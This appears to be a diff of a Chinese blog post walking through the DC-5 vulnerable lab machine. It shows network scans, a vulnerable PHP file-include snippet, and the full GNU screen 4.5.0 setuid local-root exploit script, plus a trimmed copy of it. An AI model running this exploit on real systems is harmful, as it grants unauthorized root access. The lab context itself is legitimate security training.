@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="靶机,nmap,提权,masscan,find,">
+  <meta name="keywords" content="靶机,nmap,提权,masscan,find,gobuster,">
 
 
 
@@ -81,13 +81,13 @@
 
 
 
-<meta name="description" content="DC 5 之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了 123456789101112# root @ kali in ~ [4:06:38] $ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 25">
-<meta name="keywords" content="靶机,nmap,提权,masscan,find">
+<meta name="description" content="DC 5 扫描ip地址 之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了 123456789101112# root @ kali in ~ [4:06:38] $ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5">
+<meta name="keywords" content="靶机,nmap,提权,masscan,find,gobuster">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DC靶机渗透">
 <meta property="og:url" content="https://prontosil.club/2019/08/09/DC靶机渗透/index.html">
 <meta property="og:site_name" content="prontosil">
-<meta property="og:description" content="DC 5 之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了 123456789101112# root @ kali in ~ [4:06:38] $ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 25">
+<meta property="og:description" content="DC 5 扫描ip地址 之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了 123456789101112# root @ kali in ~ [4:06:38] $ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-0.png">
@@ -95,11 +95,13 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-2.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-3.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-4.png">
+<meta property="og:image" content="https://prontosil.club/assets/kali.png">
+<meta property="og:image" content="https://prontosil.club/assets/kali1.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc2-0.png">
-<meta property="og:updated_time" content="2019-08-13T01:59:08.354Z">
+<meta property="og:updated_time" content="2019-10-08T15:34:02.891Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DC靶机渗透">
-<meta name="twitter:description" content="DC 5 之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了 123456789101112# root @ kali in ~ [4:06:38] $ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 25">
+<meta name="twitter:description" content="DC 5 扫描ip地址 之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了 123456789101112# root @ kali in ~ [4:06:38] $ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5.png">
 
 
@@ -357,8 +359,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-08-13T09:59:08+08:00">
-                2019-08-13
+              <time title="Post modified" itemprop="dateModified" datetime="2019-10-08T23:34:02+08:00">
+                2019-10-08
               </time>
             
           </span>
@@ -407,7 +409,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  3.2k
+                  3.4k
                 </span>
               
 
@@ -423,7 +425,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  17
+                  18
                 </span>
               
             </div>
@@ -445,14 +447,18 @@
 
       
         <h2>DC 5</h2>
+<h2>扫描ip地址</h2>
 <p>之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了</p>
 <p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [4:06:38] </span><br><span class="line">$ arp-scan 192.168.41.0/24</span><br><span class="line">Interface: eth0, datalink type: EN10MB (Ethernet)</span><br><span class="line">Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.41.1	00:50:56:c0:00:08	VMware, Inc.</span><br><span class="line">192.168.41.2	00:50:56:e0:f7:aa	VMware, Inc.</span><br><span class="line">192.168.41.166	00:0c:29:d7:ef:a4	VMware, Inc.</span><br><span class="line">192.168.41.167	00:0c:29:fd:e8:73	VMware, Inc. ---&gt; DC5靶机</span><br><span class="line">192.168.41.254	00:50:56:f5:fb:f6	VMware, Inc.</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.5: 256 hosts scanned in 2.346 seconds (109.12 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure></p>
+<h2>扫描端口</h2>
 <p>masscan扫出了几个端口：</p>
 <p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [4:09:46] </span><br><span class="line">$ masscan -p0-65535 192.168.41.167 --rate=1000000</span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 08:10:19 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65536 ports/host]</span><br><span class="line">Discovered open port 80/tcp on 192.168.41.167                                  </span><br><span class="line">Discovered open port 111/tcp on 192.168.41.167                                 </span><br><span class="line">Discovered open port 33188/tcp on 192.168.41.167</span><br></pre></td></tr></table></figure></p>
+<h2>扫描端口对应的服务</h2>
 <p>然后上nmap扫服务</p>
 <p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [4:10:42] </span><br><span class="line">$ nmap -p80,111,33188 -sV -T4 192.168.41.167</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-09 04:15 EDT</span><br><span class="line">Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 66.67% done; ETC: 04:15 (0:00:06 remaining)</span><br><span class="line">Nmap scan report for 192.168.41.167</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    nginx 1.6.2</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">33188/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:FD:E8:73 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.63 seconds</span><br></pre></td></tr></table></figure></p>
 <p>访问原始网页：</p>
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5.png" alt=""></p>
+<h2>扫描后台——推荐使用 gobuster</h2>
 <p><code>dirsearch.py</code>似乎没有发现什么</p>
 <p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Target: http://192.168.41.167                                                                                           </span><br><span class="line">[16:24:35] Starting:</span><br><span class="line">[16:24:35] 400 -  172B  - /%2e%2e/google.com</span><br><span class="line">[16:24:42] 301 -  184B  - /css  -&gt;  http://192.168.41.167/css/</span><br><span class="line">[16:24:44] 301 -  184B  - /images  -&gt;  http://192.168.41.167/images/</span><br><span class="line">[16:24:44] 200 -    4KB - /index.php</span><br></pre></td></tr></table></figure></p>
 <p>看了师傅们的提示，发现footer.php很有趣
@@ -479,6 +485,16 @@
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-4.png" alt=""></p>
 <p>exploit-db上搜一下exp：</p>
 <p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"~ gnu/screenroot ~"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] First, we create our shell and library..."</span></span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">"/tmp/rootshell"</span>, 0, 0);</span><br><span class="line">    chmod(<span class="string">"/tmp/rootshell"</span>, 04755);</span><br><span class="line">    unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] done!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(<span class="string">"/bin/sh"</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Now we create our /etc/ld.so.preload file..."</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure></p>
+<h2>提权方法</h2>
+<p><a href="https://www.exploit-db.com/exploits/41154" target="_blank" rel="noopener">exploit 地址</a></p>
+<p>下载下来之后直接运行是不太可能的，我们需要将其中的C语言文件单独编译</p>
+<p><img src="/assets/kali.png" alt="1570548517732"></p>
+<p>然后修改原有的sh脚本</p>
+<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"~ gnu/screenroot ~"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] First, we create our shell and library..."</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Now we create our /etc/ld.so.preload file..."</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure></p>
+<p>但是我不知道怎么将文件上传到靶机中，尝试过使用python开启一个服务器然后用wget命令还是失败了</p>
+<p><img src="/assets/kali1.png" alt="1570548773430"></p>
+<p>如图发现还是失败了</p>
+<p>（纠结在不知道如何将文件传过去。tcl</p>
 <h3>DC5后记</h3>
 <p>thankyou.php文件中有以下内容；典型的本地文件包含漏洞
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class="footer-wrapper"&gt;</span><br><span class="line">	&lt;footer&gt;</span><br><span class="line">		<span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">			$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">				<span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">include</span>(<span class="string">"$file"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">include</span>(<span class="string">"footer.php"</span>);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">		<span class="meta">?&gt;</span></span><br><span class="line">	&lt;/footer&gt;</span><br></pre></td></tr></table></figure></p>
@@ -576,6 +592,8 @@
             <a href="/tags/masscan/" rel="tag"># masscan</a>
           
             <a href="/tags/find/" rel="tag"># find</a>
+          
+            <a href="/tags/gobuster/" rel="tag"># gobuster</a>
           
         </div>
       
@@ -681,7 +699,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-count">70</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -692,7 +710,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
@@ -703,7 +721,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-count">75</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
@@ -790,7 +808,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">DC 5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">1.1.</span> <span class="nav-text">DC5后记</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">DC1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">3.</span> <span class="nav-text">DC-6靶机——wordpress渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">5.</span> <span class="nav-text">Game-of-Thrones-CTF-1靶机复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">5.1.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">6.</span> <span class="nav-text">DC-2靶机</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">DC 5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">扫描ip地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">3.</span> <span class="nav-text">扫描端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">4.</span> <span class="nav-text">扫描端口对应的服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">5.</span> <span class="nav-text">扫描后台——推荐使用 gobuster</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">6.</span> <span class="nav-text">提权方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">6.1.</span> <span class="nav-text">DC5后记</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">7.</span> <span class="nav-text">DC1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">8.</span> <span class="nav-text">DC-6靶机——wordpress渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">9.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">10.</span> <span class="nav-text">Game-of-Thrones-CTF-1靶机复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">10.1.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">11.</span> <span class="nav-text">DC-2靶机</span></a></li></ol></div>
             
 
           </div>
